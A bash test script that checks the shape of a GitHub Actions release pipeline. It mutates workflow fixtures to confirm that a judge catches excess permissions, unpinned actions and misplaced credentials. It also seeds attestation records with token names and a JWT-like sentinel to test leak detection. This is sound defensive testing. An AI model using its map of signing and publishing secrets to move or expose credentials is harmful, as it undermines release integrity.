#!/usr/bin/env bash
# proves: REQ-CHAIN-007-AC1, REQ-CHAIN-007-AC2, REQ-CHAIN-007-AC3, REQ-CHAIN-007-AC4, REQ-CHAIN-007-AC6, REQ-CHAIN-007-AC7, REQ-CHAIN-007-AC8, REQ-CHAIN-007-AC9, REQ-CHAIN-007-AC10, REQ-CHAIN-007-AC11, REQ-CHAIN-007-AC12, REQ-CHAIN-007-AC13, REQ-CHAIN-007-AC14, REQ-CHAIN-007-AC16, REQ-CHAIN-007-AC19, REQ-CHAIN-005-AC4
# RED until PR 4 is implemented (stage-promote.yml rewritten, bin/release-*.sh, chain-scripts.json rows, the old authorization machinery removed): step 4.
#
# Release, static half (v0.3.0 rules 5, 17, 29, 50, 52, 53, 53b, 56, 57, 60, 61, 63, 64, 65, 69, 70, 71; advisor read-back approved Oct 9 with three
# rulings: rc tags verify like finals, the release policy is signed with cosign so it is in Rekor, signatures in both registries; PR 4 merges into
# chain-v030 only). Runs on ubuntu-24.04 or macOS with: bash, python3 + PyYAML (apt: python3-yaml). No network, no secrets, no keys.
# Every judge lives in bin/chain-release-shape.py and is FIRST proven on a known-good fixture and on mutated copies (a judge that cannot fail
# shows nothing), then applied to the real repository, which must pass. Finite grammars and allowlists, no shell analysis. The behaviour of
# the scripts (what they do with stub records, a stub registry and a fake signer) is in bin/chain-release-scripts-test.sh.
#
# WHAT IS FIXED BY AN EXISTING FILE and what is PROPOSED/UNVERIFIED:
#   [F] the old stage-promote.yml (crane copy by digest to ghcr.io and docker.io, cosign sign in BOTH registries, the environment named release,
#       DOCKERHUB_USERNAME and DOCKERHUB_TOKEN as environment secrets) and apk-tool.py signer (assembly.rsa.pub | release.rsa.pub | unsigned)
#       and the name APK_RELEASE_SIGNING_KEY (cache-3f's interface note: build-apk.sh refuses it).
#   [P] the five script names and their command lines, `melange sign` as the re-signing tool, `crane` as the copy tool, the artifact names, the
#       witnessed helper (bin/witnessed.sh STEP SCRIPT is PR 2's seam; here it is only called), the --rekor-stub flag on stage-start.
set -euo pipefail
root=$(cd "$(dirname "$0")/.." && pwd)
shape="$root/bin/chain-release-shape.py"
work=$(mktemp -d); trap 'rm -rf "$work"' EXIT
pass=0 failn=0
python3 -c 'import yaml' 2> /dev/null || { echo "FAIL PyYAML is required (apt: python3-yaml)"; exit 1; }
ok()  { pass=$((pass + 1)); echo "ok   $1"; }
bad() { failn=$((failn + 1)); echo "FAIL $1"; }
expect() { # expect ok|caught LABEL WORD args...   (WORD: text the fault message must contain, for caught)
  local want=$1 label=$2 word=$3; shift 3; local out rc=0
  out=$(python3 "$shape" "$@" 2>&1) || rc=$?
  if [ "$want" = ok ]; then
    if [ "$rc" = 0 ]; then ok "$label"; else bad "$label -> $out"; fi
  elif [ "$rc" = 1 ] && grep -Fq -- "$word" <<< "$out"; then ok "$label (caught: ${out:0:80})"
  else bad "$label -> rc=$rc, wanted a refusal containing '$word': ${out:0:140}"; fi
}
mutate() { # mutate SRC DST REGEX REPLACEMENT   (a pattern that no longer matches is a FAILURE, never a skipped case)
  python3 - "$1" "$2" "$3" "$4" <<'PY' || { bad "mutation did not apply: $3"; return 1; }
import re, sys
t = open(sys.argv[1]).read()
pat = re.escape(sys.argv[3][1:].replace("\\n", "\n")) if sys.argv[3].startswith("=") else sys.argv[3]
n = re.sub(pat, lambda m: m.expand(sys.argv[4].replace("\\n", "\n")), t, count=1, flags=re.S)
assert n != t, "mutation did not change the fixture"
open(sys.argv[2], "w").write(n)
PY
}
# ---- known-good fixtures ----------------------------------------------------------------------------------------------
python3 - "$work" <<'PY'
import base64, hashlib, json, os, sys
w = sys.argv[1]
CHK = "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1"
UPL = "actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1"
DWN = "actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1"
def dn(name, path=None): return f"      - uses: {DWN}\n        with:\n          name: {name}\n          path: {path or name}\n"
def up(name): return f"      - uses: {UPL}\n        with:\n          name: {name}\n          path: {name}\n"
def inst(t): return f"      - name: install {t}\n        run: bash bin/install-scanner.sh {t}\n"
def inst_m(t): return f"      - name: install {t}\n        run: bash bin/install-build-tools.sh {t}\n"      # REQ-CHAIN-007-AC1 (Astra R4): release-sign-apks.sh needs the pinned melange binary
def wit(step, env, helper="witnessed.sh"):
    e = "".join(f"          {k}: {v}\n" for k, v in env.items())
    cond = "" if step == "release-verify" else "        if: ${{ !contains(github.ref_name, '-') }}\n"   # a release candidate (a tag with a hyphen) ends after release-verify (AC14)
    return f"      - name: {step}\n" + cond + (f"        env:\n{e}" if env else "") + f"        run: bash bin/{helper} {step} bin/{step}.sh\n"
def renv(step, always=False, local=False):
    cond = "" if always or step == "release-verify" else "        if: ${{ !contains(github.ref_name, '-') }}\n"
    return f"      - name: {step} record holds no token\n" + cond + f"        run: python3 -I bin/chain-verify.py record-env --record witness-{step}/{step}-collection{'.local' if local else ''}.json\n"
# W1 (#822 round 1; wording pending the owner's approval for REQ-CHAIN-007-AC1 and AC2, whose text says no env up to and including release-verify, and AC18, whose text refuses any other env name): every witnessed step of the release job (the helper signs each record through the one signing function) carries the three non-secret federation entries as literals
FED = {"AWS_ROLE_ARN": "arn:aws:iam::821302803867:role/fosterstack-cache-release-signing", "AWS_REGION": "us-east-1", "RELEASE_KMS_KEY_REF": "awskms:///alias/fosterstack-release-signing"}
REG = {"DOCKERHUB_USERNAME": "${{ secrets.DOCKERHUB_USERNAME }}", "DOCKERHUB_TOKEN": "${{ secrets.DOCKERHUB_TOKEN }}", "GH_TOKEN": "${{ github.token }}"}
VDOWN = ("signed-witness-build", "digests", "items", "signed-witness-rebuild", "signed-witness-check", "check-results", "provenance", "apk-compare")      # what release-verify reads: the records and Check's govulncheck stream
VPATH = {"signed-witness-build": "witness-build", "digests": "witness-build", "items": "witness-build", "signed-witness-rebuild": "witness-rebuild", "signed-witness-check": "witness-check", "check-results": "check-results", "provenance": "provenance", "apk-compare": "apk-compare"}
def vdowns(): return "".join(dn(n, VPATH[n]) for n in VDOWN) + dn("admission-baseline", "witness-build") + dn("signed-witness-check-arm64", "witness-check/witness-arm64")      # the pairs of the real stage file
RC_COND = "    if: ${{ !contains(github.ref_name, '-') }}\n"
# REQ-CHAIN-007-AC1 (Astra R6) and the owner's rule of Oct 21 2026 (signer and builder never share a machine): THREE jobs. `compare` holds contents read ONLY (no id-token, no environment,
# no secret): it receives Build's and Rebuild's apks, runs bin/release-compare.sh as a plain step and uploads the small result apk-compare. `verify` needs it and holds contents read
# only (it runs release-verify under the local Witness script with a throwaway key: no identity token), no environment, no secret, and reads only the result file; `release` needs both, is skipped for a release candidate, holds the environment and the three
# writes, receives Build's artifacts only (never a rapk), and re-runs release-verify first on its own downloads before any credential step.
def up_checked(name): return up(name).rstrip("\n") + "\n          if-no-files-found: error\n"
stage = ("name: 'Stage: release'\non:\n  workflow_call:\npermissions:\n  contents: read\njobs:\n"
         "  compare:\n    runs-on: ubuntu-24.04\n    permissions:\n      contents: read\n    steps:\n"
         f"      - uses: {CHK}\n        with:\n          persist-credentials: false\n"
         + dn("apk-ubuntu-24.04", "apks/ubuntu-24.04") + dn("apk-ubuntu-24.04-arm", "apks/ubuntu-24.04-arm") + dn("rapk-ubuntu-24.04", "rapks/ubuntu-24.04") + dn("rapk-ubuntu-24.04-arm", "rapks/ubuntu-24.04-arm")
         + dn("signed-witness-rapk-ubuntu-24.04", "witness-rapk-ubuntu-24.04") + dn("signed-witness-rapk-ubuntu-24.04-arm", "witness-rapk-ubuntu-24.04-arm")
         + "      - name: compare Build's and Rebuild's apks\n        run: bash bin/release-compare.sh\n" + up_checked("apk-compare")
         + "  verify:\n    needs: compare\n    runs-on: ubuntu-24.04\n    permissions:\n      contents: read\n    steps:\n"
         f"      - uses: {CHK}\n        with:\n          persist-credentials: false\n"
         + inst("witness") + vdowns() + wit("release-verify", {}, "witnessed-local.sh") + renv("release-verify", True, True) + up("witness-release-verify").rstrip("\n") + "\n          if-no-files-found: error\n"
         + "  release:\n    needs: [compare, verify]\n" + RC_COND + "    runs-on: ubuntu-24.04\n    environment: release\n"
         "    permissions:\n      contents: write\n      packages: write\n      id-token: write\n    steps:\n"
         f"      - uses: {CHK}\n        with:\n          persist-credentials: false\n"
         + inst("witness") + inst("cosign") + inst("crane") + inst_m("melange")
         + vdowns()      # the nine records and files release-verify reads (the baseline admission chose, REQ-CHAIN-007-AC19; the arm64 leg's record, REQ-CHAIN-006-AC17), then the six the later steps use
         + "".join(dn(n, pth) for n, pth in (("dist", "dist"), ("images", "images"), ("apk-ubuntu-24.04", "apks/ubuntu-24.04"), ("apk-ubuntu-24.04-arm", "apks/ubuntu-24.04-arm")))
         + wit("release-verify", FED) + wit("release-apks", dict(FED, APK_RELEASE_SIGNING_KEY="${{ secrets.APK_RELEASE_SIGNING_KEY }}"))
         + wit("release-publish", dict(FED, **REG)) + wit("release-sign", dict(FED, **REG)) + wit("release-assets", dict(FED, GH_TOKEN="${{ github.token }}")) + wit("release-postverify", dict(FED, GH_TOKEN="${{ github.token }}"))
         + "".join(renv(x) for x in ("release-verify", "release-apks", "release-publish", "release-sign", "release-assets", "release-postverify"))      # rc-2 R4: the six records are checked for a token before any upload
         + up("release-evidence") + up("witness-release"))
open(w + "/stage.yml", "w").write(stage)
open(w + "/release.yml", "w").write("""name: Release
on:
  push:
    tags: ["v*"]
permissions:
  contents: read
jobs:
  decide:
    runs-on: ubuntu-latest
    steps:
      - run: echo ${{ secrets.AUDITOR_APP_ID }}
  build:
    if: ${{ (github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')) || inputs.dry-run == true }}
    uses: ./.github/workflows/stage-build.yml
  sign:
    needs: build
    if: ${{ (github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')) || inputs.dry-run == true }}
    uses: ./.github/workflows/stage-sign.yml
  rebuild:
    needs: [build, sign]
    uses: ./.github/workflows/stage-reproducibility.yml
  sign-rebuild:
    needs: [build, rebuild]
    uses: ./.github/workflows/stage-sign.yml
  check:
    needs: [build, sign]
    uses: ./.github/workflows/stage-verify.yml
  sign-check:
    needs: [build, check]
    uses: ./.github/workflows/stage-sign.yml
  release:
    if: ${{ startsWith(github.ref, 'refs/tags/v') && !inputs.dry-run }}
    needs: [check, sign, sign-rebuild, sign-check]
    uses: ./.github/workflows/stage-promote.yml
    permissions:
      contents: write
      packages: write
      id-token: write
""")
# the other chain stage files: no packages write, no secrets
os.makedirs(w + "/o/.github/workflows", exist_ok=True)
for n in ("stage-build", "stage-sign", "stage-reproducibility", "stage-verify"):
    open(f"{w}/o/.github/workflows/{n}.yml", "w").write("name: x\non:\n  workflow_call:\njobs:\n  j:\n    runs-on: ubuntu-24.04\n    permissions:\n      contents: read\n      id-token: write\n    steps:\n      - run: bash bin/witnessed.sh j bin/j.sh\n")
open(w + "/o/.github/workflows/stage-promote.yml", "w").write(stage)
open(w + "/o/.github/workflows/release.yml", "w").write(open(w + "/release.yml").read())
# bin/release-verify.sh: tag, policy, four stage-starts
V = ['[[ "${GITHUB_REF_NAME:-}" =~ ^v[0-9]+\\.[0-9]+\\.[0-9]+(-rc[0-9]+)?$ ]] || { echo "refused at tag: ${GITHUB_REF_NAME:-} is not vX.Y.Z or vX.Y.Z-rcN" >&2; exit 1; }',
     'python3 bin/chain-verify.py policy make --template .github/policy/release-policy.template.json --tag "$GITHUB_REF_NAME" --out policy.json',
     "python3 bin/chain-verify.py stage-start --stage release --previous build --record witness-build/build-collection.json --digests witness-build/digests.json --policy policy.json",
     "python3 bin/chain-verify.py bind-items --policy policy.json --record witness-build/build-collection.json --items witness-build/items.json",
     "python3 bin/chain-verify.py bind-items --policy policy.json --record witness-build/build-collection.json --items witness-build/admission-baseline.json --product admission-baseline.json",
     "python3 bin/chain-verify.py stage-start --stage release --previous sign --record provenance/provenance.json --digests witness-build/digests.json --policy policy.json --rekor-stub provenance/provenance.rekor.json",
     "python3 bin/chain-verify.py stage-start --stage release --previous rebuild --record witness-rebuild/rebuild-collection.json --digests witness-build/digests.json --policy policy.json",
     "python3 bin/chain-verify.py apk-compare --file apk-compare/apk-compare.json --digests witness-build/digests.json",
     "python3 bin/chain-verify.py check-list --policy policy.json --digests witness-build/digests.json --dir witness-check",
     # ruling G (advisor Oct 12): the govulncheck stream Release hands the evidence step is a product of Check's scanners record, bound under Check's identity
     "python3 bin/chain-verify.py bind-check --policy policy.json --record witness-check/witness-scanners/scanners-collection.json --digests witness-build/digests.json --file check-results/govulncheck.json --product check-results/govulncheck.json"]
open(w + "/verify.sh", "w").write("#!/usr/bin/env bash\nset -euo pipefail\n" + "\n".join(V) + "\n")
# the five release scripts, plain, using only their tools; and the list that describes them
os.makedirs(w + "/s/bin", exist_ok=True); os.makedirs(w + "/s/.github/policy", exist_ok=True)
BODY = {
 "release-verify": "set -euo pipefail\npython3 bin/chain-verify.py verify --stage build\n",
 "release-compare": "set -euo pipefail\npython3 -I -B bin/release-compare.py\n",
 "release-apks": 'set -euo pipefail\nkeyfile=$(mktemp)\ntrap \'rm -f "$keyfile"\' EXIT\nprintf %s "$APK_RELEASE_SIGNING_KEY" > "$keyfile"\npython3 bin/apk-tool.py digest apks/a.apk\nbash bin/release-sign-apks.sh --build-dir b --key "$keyfile"\n',
 "release-publish": 'set -euo pipefail\npython3 bin/release-layout.py images/x "$digest"\ncrane copy "src@$digest" "dst:$tag"\ncrane digest "dst:$tag" | jq -R .\n',
 "release-sign": 'set -euo pipefail\ndate=$(git log -1 --format=%ct "$GITHUB_SHA")\npython3 bin/vendor-provenance.py evidence --out evidence\ncosign sign --yes "ghcr.io/x@$digest"\ncosign sign-blob --yes --bundle policy.bundle policy.json\njq . policy.bundle\n',
 "release-postverify": 'set -euo pipefail\npython3 bin/release-postverify.py\n',
 "release-assets": 'set -euo pipefail\ngh release upload "$GITHUB_REF_NAME" apks/* dist/* --clobber\ngh release create "$GITHUB_REF_NAME" --verify-tag --draft\n',
}
ROWS = {"release-verify": (["python3"], False, ["bin/chain-verify.py"]), "release-compare": (["python3"], False, ["bin/release-compare.py"]), "release-apks": (["bash", "jq", "python3", "trap"], "other", ["bin/apk-tool.py", "bin/release-sign-apks.sh"]),
        "release-publish": (["crane", "jq", "python3", "trap"], False, ["bin/release-layout.py"]), "release-sign": (["cosign", "git", "jq", "python3", "trap"], "other", ["bin/release-metadata.py", "bin/vendor-provenance.py", "bin/vex-forms.py"]),
        "release-assets": (["gh", "git", "python3"], False, ["bin/release-metadata.py"]), "release-postverify": (["python3"], False, ["bin/release-postverify.py"])}
rows = []
for n, b in BODY.items():
    open(f"{w}/s/bin/{n}.sh", "w").write("#!/usr/bin/env bash\n" + b)
    t, s, r = ROWS[n]
    rows.append({"path": f"bin/{n}.sh", "sha256": hashlib.sha256(open(f"{w}/s/bin/{n}.sh", "rb").read()).hexdigest(), "tools": t, "signs": s, "runs": r, "reason": "fixture"})
open(w + "/s/bin/release-postverify.py", "w").write("import subprocess\n")
rows.append({"path": "bin/release-postverify.py", "sha256": hashlib.sha256(open(w + "/s/bin/release-postverify.py", "rb").read()).hexdigest(), "tools": ["at", "bash", "command", "cosign", "gh", "jq", "just"], "signs": False, "runs": [], "reason": "fixture"})
open(w + "/s/bin/release-compare.py", "w").write("import sys\n")
rows.append({"path": "bin/release-compare.py", "sha256": hashlib.sha256(open(w + "/s/bin/release-compare.py", "rb").read()).hexdigest(), "tools": ["make"], "signs": False, "runs": ["bin/apk-tool.py", "bin/chain-verify.py"], "reason": "fixture"})
open(w + "/s/bin/release-layout.py", "w").write("import sys\n")
rows.append({"path": "bin/release-layout.py", "sha256": hashlib.sha256(open(w + "/s/bin/release-layout.py", "rb").read()).hexdigest(), "tools": [], "signs": False, "runs": [], "reason": "fixture"})
open(w + "/s/bin/witnessed.sh", "w").write("#!/usr/bin/env bash\nset -euo pipefail\n")
rows.append({"path": "bin/witnessed.sh", "sha256": hashlib.sha256(open(w + "/s/bin/witnessed.sh", "rb").read()).hexdigest(), "tools": ["timeout", "witness"], "signs": False, "runs": [], "reason": "fixture"})
json.dump({"scripts": rows}, open(w + "/s/.github/policy/chain-scripts.json", "w"))
# a Witness envelope: payload is base64 of a collection with an environment attestor
col = {"_type": "https://in-toto.io/Statement/v0.1", "predicateType": "https://witness.testifysec.com/attestation-collection/v0.1",
       "predicate": {"name": "release-publish", "attestations": [{"type": "https://witness.dev/attestations/environment/v0.1",
       "attestation": {"os": "linux", "variables": {"HOME": "/home/runner", "CI": "true"}}}]}}
def env(c): return {"payloadType": "application/vnd.in-toto+json", "payload": base64.b64encode(json.dumps(c).encode()).decode(), "signatures": [{"sig": "AAAA"}]}
json.dump(env(col), open(w + "/record.json", "w"))
for name, add in (("r_name", {"GH_TOKEN": "x"}), ("r_dh", {"DOCKERHUB_TOKEN": "x"}), ("r_apk", {"APK_RELEASE_SIGNING_KEY": "x"}),
                  ("r_idt", {"ACTIONS_ID_TOKEN_REQUEST_URL": "u"}), ("r_rt", {"ACTIONS_RUNTIME_TOKEN": "t"}),
                  ("r_val", {"X": "SENTINEL-VALUE-123"}), ("r_jwt", {"X": "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ4In0.c2ln"})):
    c = json.loads(json.dumps(col)); c["predicate"]["attestations"][0]["attestation"]["variables"].update(add)
    json.dump(env(c), open(f"{w}/{name}.json", "w"))
open(w + "/r_plain.json", "w").write(json.dumps(col))                              # a bare statement, not an envelope
json.dump({"payloadType": "x", "payload": base64.b64encode(b"not json").decode(), "signatures": []}, open(w + "/r_garbage.json", "w"))
PY
expect ok "fixture: the known-good stage-promote.yml passes the stage judge" "" stage "$work/stage.yml"
expect ok "fixture: the credentials reach only the steps that need them" "" credentials "$work/stage.yml"
expect ok "fixture: no other chain file holds packages write or a credential" "" others "$work/o"
rm -rf "$work/o_scout"; cp -r "$work/o" "$work/o_scout"; printf '      DOCKERHUB_USERNAME: x\n      DOCKERHUB_SCOUT_TOKEN: y\n' >> "$work/o_scout/.github/workflows/stage-verify.yml"
expect ok "fixture: the rescan's own read-only Scout token and username are a different credential" "" others "$work/o_scout"
expect ok "fixture: the known-good release.yml graph" "" graph "$work/release.yml"
expect ok "fixture: the known-good bin/release-verify.sh" "" verify "$work/verify.sh"
for n in release-verify release-apks release-publish release-sign release-assets release-postverify; do
  expect ok "fixture: bin/$n.sh is plain (only its tools)" "" scan "$work/s/bin/$n.sh" "$work/s/.github/policy/chain-scripts.json"
done
expect ok "fixture: all release scripts and the helper are listed with sha256, tools, signs and runs" "" listed "$work/s/.github/policy/chain-scripts.json" "$work/s"
expect ok "fixture: a Witness record with none of the credentials" "" record "$work/record.json" SENTINEL-VALUE-123
mkdir -p "$work/rm" && expect ok "fixture: none of the old authorization machinery" "" removed "$work/rm"
# ---- rc-2 R4 (Fable): the run strings of the real stage-promote.yml are EXECUTED: a clean record exits 0, a leaking one exits 1, a missing one exits 2 -------------
python3 - "$root" "$work" <<'PYX' && ok "AC12 (R4) every record-env run string of the real stage-promote.yml executes: clean 0, leaking 1, missing 2 (seven steps: six in the release job, one in the verify job)" || bad "AC12 (R4) the record-env run strings do not execute as the grammar says"
import base64, json, os, re, subprocess, sys, tempfile, yaml
root, work = sys.argv[1], sys.argv[2]
wf = yaml.safe_load(open(root + "/.github/workflows/stage-promote.yml"))
runs = [(jn, s["run"]) for jn in ("verify", "release") for s in wf["jobs"][jn]["steps"] if "record-env" in (s.get("run") or "")]
assert len(runs) == 7, runs
def env(payload):
    st = {"_type": "https://in-toto.io/Statement/v1", "predicateType": "https://witness.dev/attestations/collection/v0.1", "subject": [], "predicate": {"name": "x", "attestations": [payload]}}
    return json.dumps({"payloadType": "application/vnd.in-toto+json", "payload": base64.b64encode(json.dumps(st).encode()).decode(), "signatures": []})
for jn, run in runs:
    step = re.search(r"witness-(release-[a-z]+)/", run).group(1)
    rec = re.search(r"--record (\S+)", run).group(1)
    for kind, body, want in (("clean", env({"type": "environment", "attestation": {"variables": {"CI": "true"}}}), 0), ("leaking", env({"type": "environment", "attestation": {"variables": {"GH_TOKEN": "x"}}}), 1), ("missing", None, 2)):
        with tempfile.TemporaryDirectory() as d:
            os.symlink(root + "/bin", d + "/bin"); os.symlink(root + "/.github", d + "/.github")     # the verifier reads the helper hashes in .github/policy, as in the checkout
            if body is not None:
                os.makedirs("%s/witness-%s" % (d, step)); open("%s/%s" % (d, rec), "w").write(body)
            r = subprocess.run(["bash", "-c", run], cwd=d, capture_output=True, text=True)
            assert r.returncode == want, (jn, step, kind, r.returncode, want, r.stdout[-200:], r.stderr[-300:])
PYX
# ---- AC1: the stage file, mutated one rule at a time ----------------------------------------------------------------------
m() { # m NAME REGEX REPL WORD LABEL
  if mutate "$work/stage.yml" "$work/$1.yml" "$2" "$3"; then expect caught "$5" "$4" stage "$work/$1.yml"; fi
}
m s_job2    'jobs:\n  compare:'                          'jobs:\n  extra:\n    runs-on: ubuntu-24.04\n    steps: []\n  compare:' 'exactly'  "AC1 a fourth job"
m s_selfh   'runs-on: ubuntu-24.04'                         'runs-on: self-hosted'                                   'ubuntu-24.04'       "AC1 a self-hosted runner"
m s_envnone '    environment: release\n'                     ''                                                       'environment'        "AC1 no environment (the credentials would not be protected)"
m s_envoth  'environment: release'                          'environment: agent'                                     'environment'        "AC1 another environment"
m s_pkg     '      packages: write\n'                       ''                                                       'permissions'        "AC1 no packages write (cannot publish)"
m s_att     'id-token: write\n    steps'                    'id-token: write\n      attestations: write\n    steps'  'permissions'        "AC1 attestations write"
m s_noid    'id-token: write\n    steps'                    'id-token: none\n    steps'                               'permissions'        "AC1 no id-token"
m s_cont    '    environment: release\n'                     '    environment: release\n    container: alpine\n'        'job keys'           "AC1 a job container"
m s_jenv    '    environment: release\n'                     '    environment: release\n    env: {X: y}\n'              'job keys'           "AC1 job env"
m s_needs   '    environment: release\n'                     '    environment: release\n    needs: x\n'                 'needs'              "AC1 the release job names a second needs (x) besides verify"
m s_wf      'permissions:\n  contents: read\njobs'          'permissions:\n  contents: read\nenv: {A: b}\njobs'      'workflow keys'      "AC1 workflow env"
m s_trig    'workflow_call:'                                'workflow_call:\n  push:'                                'workflow_call'      "AC1 an extra trigger"
m s_unp     'actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1' 'actions/checkout@v4'                          'digest-pinned'      "AC1 an unpinned checkout"
m s_persist 'persist-credentials: false'                    'persist-credentials: true'                              'persist-credentials' "AC1 persisted credentials"
m s_dlname  'name: provenance\n          path: provenance' 'name: not-listed\n          path: provenance'             'download-artifact'  "AC1 a download outside the allowlist"
m s_noarm   '      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: signed-witness-check-arm64\n          path: witness-check/witness-arm64\n' '' 'witness-check-arm64' "AC16 the arm64 Check record is not downloaded (check-list would refuse the release, so the stage must fetch it)"
m s_nocr    '      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: check-results\n          path: check-results\n' '' 'check-results' "G Check's scanner product (check-results/govulncheck.json) is not downloaded: release-sign would have no file to pass"
m s_crpath  'name: check-results\n          path: check-results' 'name: check-results\n          path: witness-check' 'check-results' "G check-results lands inside witness-check/ (check-list refuses a stray file there)"
m s_armpath 'path: witness-check/witness-arm64' 'path: witness-arm64'                          'witness-check-arm64' "AC16 the arm64 record lands outside witness-check/ (check-list reads witness-check/witness-arm64/)"
m s_dlbin   'name: images\n          path: images'        'name: images\n          path: bin'                           'download-artifact'  "AC1 a download into bin/"
m s_dlgh    'name: dist\n          path: dist'            'name: dist\n          path: .github'                       'download-artifact'  "AC1 a download into .github/"
m s_upname  'name: release-evidence\n          path: release-evidence' 'name: anything\n          path: release-evidence' 'upload-artifact'  "AC1 an upload outside the allowlist"
m s_noup    '      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1\n        with:\n          name: release-evidence\n          path: release-evidence\n      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1\n        with:\n          name: witness-release\n          path: witness-release\n' '' 'only uploads' "AC1 no upload of the evidence"
# rc-2 R4 (Fable R4): the Release job checks each of its own six Witness records for a token (REQ-CHAIN-007-AC12) right after the witnessed steps and before any upload
m s_re_none '      - name: release-apks record holds no token\n        if: [^\n]*\n        run: python3 -I bin/chain-verify\.py record-env --record witness-release-apks/release-apks-collection\.json\n' '' 'Witness records for a token' "AC12 (R4) one of the six record checks is missing"
m s_re_path '=record-env --record witness-release-sign/release-sign-collection.json' 'record-env --record witness-release-sign/release-apks-collection.json' 'none of checkout' "AC12 (R4) a record check that reads another step's record"
m s_re_swallow '=record-env --record witness-release-publish/release-publish-collection.json' 'record-env --record witness-release-publish/release-publish-collection.json || true' 'none of checkout' "AC12 (R4) a record check whose failure is swallowed"
m s_re_noif '(      - name: release-assets record holds no token\n)        if: [^\n]*\n' '\1' 'must carry' "AC12 (R4) a record check that runs for a release candidate (no if)"
m s_vre_none '      - name: release-verify record holds no token[^\n]*\n        run: python3 -I bin/chain-verify\.py record-env --record witness-release-verify/release-verify-collection\.local\.json\n' '' 'verify job: right after' "AC12 (R4) the verify job uploads its Witness record without checking it for a token"
m s_vre_if '(      - name: release-verify record holds no token[^\n]*\n)' '\1        if: true\n' 'no env, no if' "AC12 (R4) the verify job's record check carries an if"
m s_swap    'install cosign\n        run: bash bin/install-scanner.sh cosign\n      - name: install crane\n        run: bash bin/install-scanner.sh crane' 'install crane\n        run: bash bin/install-scanner.sh crane\n      - name: install cosign\n        run: bash bin/install-scanner.sh cosign' 'start with checkout' "AC1 the installs in another order"
m s_nocos   '      - name: install cosign\n        run: bash bin/install-scanner.sh cosign\n' ''                                                                    'start with checkout' "AC1 cosign is not installed"
m s_snyk    'install-scanner.sh crane'                      'install-scanner.sh snyk'                                'none of checkout'   "AC1 an install of a tool outside the three"
m s_nomel   '      - name: install melange\n        run: bash bin/install-build-tools.sh melange\n' ''                                'start with checkout' "AC1 (Astra R4) melange is not installed, so release-apks would fail after the images are published"
m s_melapko 'install-build-tools.sh melange'               'install-build-tools.sh apko'                            'none of checkout'   "AC1 (Astra R4) the fourth install is apko, not melange"
# REQ-CHAIN-007-AC1 (Astra R6): two jobs, verify and release
m s_vwrite   '=  verify:\n    needs: compare\n    runs-on: ubuntu-24.04\n    permissions:\n      contents: read\n' '  verify:\n    needs: compare\n    runs-on: ubuntu-24.04\n    permissions:\n      contents: write\n'  'verify'  "AC1 (Astra R6) the verify job holds contents write"
m s_vpkg     '=  verify:\n    needs: compare\n    runs-on: ubuntu-24.04\n    permissions:\n      contents: read\n' '  verify:\n    needs: compare\n    runs-on: ubuntu-24.04\n    permissions:\n      contents: read\n      packages: write\n'  'verify'  "AC1 (Astra R6) the verify job holds packages write"
m s_vnoid    '=  verify:\n    needs: compare\n    runs-on: ubuntu-24.04\n    permissions:\n      contents: read\n' '  verify:\n    needs: compare\n    runs-on: ubuntu-24.04\n    permissions:\n      contents: read\n      id-token: write\n'  'verify'  "AC1 (handoff 0713 P2) the verify job holds id-token write (it runs the local Witness script and must not be able to assume the signing role)"
m s_venv     '=  verify:\n    needs: compare\n    runs-on: ubuntu-24.04\n' '  verify:\n    needs: compare\n    environment: release\n    runs-on: ubuntu-24.04\n'  'verify'  "AC1 (Astra R6) the verify job is in the release environment (it would see its secrets)"
m s_vcos     '=install witness\n        run: bash bin/install-scanner.sh witness\n      - uses' 'install witness\n        run: bash bin/install-scanner.sh witness\n      - name: install cosign\n        run: bash bin/install-scanner.sh cosign\n      - uses' 'verify' "AC1 (Astra R6) the verify job installs a tool it does not need"
m s_vnorv    'release-verify bin/release-verify.sh'            'release-apks bin/release-apks.sh'                                      'verify'  "AC1 (Astra R6) the verify job's Witness step is not release-verify"
m s_vgone    '(?s)  verify:\n.*?(?=  release:\n)'              ''                                                                      'verify'  "AC1 (Astra R6) there is no verify job (the credentials job would verify only in itself)"
m s_rnoneeds '=  release:\n    needs: [compare, verify]\n' '  release:\n'                                                          'needs'   "AC1 (Astra R6) the release job does not need verify"
m s_rneedsot '=needs: [compare, verify]'                       'needs: build'                                                          'needs'   "AC1 (Astra R6) the release job needs another job than verify"
m s_rnoif    "=    needs: [compare, verify]\n    if: \${{ !contains(github.ref_name, '-') }}\n" '    needs: [compare, verify]\n'                          'job'     "AC1 (Astra R6) the release job is not skipped for a release candidate (it would enter the environment for an rc)"

# ---- the owner's rule of Oct 21 2026 (ops/docs/ratify/2026-10-21-signer-builder-separate-jobs.md): the comparison of Build's and Rebuild's apks is the `compare` job, which holds no key, no token and
# no environment; the jobs that hold the id-token or the signing key and the publish credentials never receive a rapk, and each build is its own job (the compare job runs no build script) ------------
m c_norel   '=needs: [compare, verify]'                        'needs: verify'                                         'needs'   "SIGNER the release job does not need the compare job"
m c_novneed '=  verify:\n    needs: compare\n'                  '  verify:\n'                                           'needs'   "SIGNER the verify job does not need the compare job"
m c_order   '=  compare:\n'                                    '  zzz:\n'                                              'exactly'  "SIGNER the compare job is missing (a job of another name stands in)"
m c_env     '=  compare:\n    runs-on: ubuntu-24.04\n'           '  compare:\n    environment: release\n    runs-on: ubuntu-24.04\n' 'compare job' "SIGNER the compare job is in the release environment"
m c_nosigned '=      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: signed-witness-rapk-ubuntu-24.04-arm\n          path: witness-rapk-ubuntu-24.04-arm\n' '' 'exactly' "SIGNER the compare job lacks the signed rapk record of the arm runner (it could not bind Rebuild's apks to a record Sign signed)"
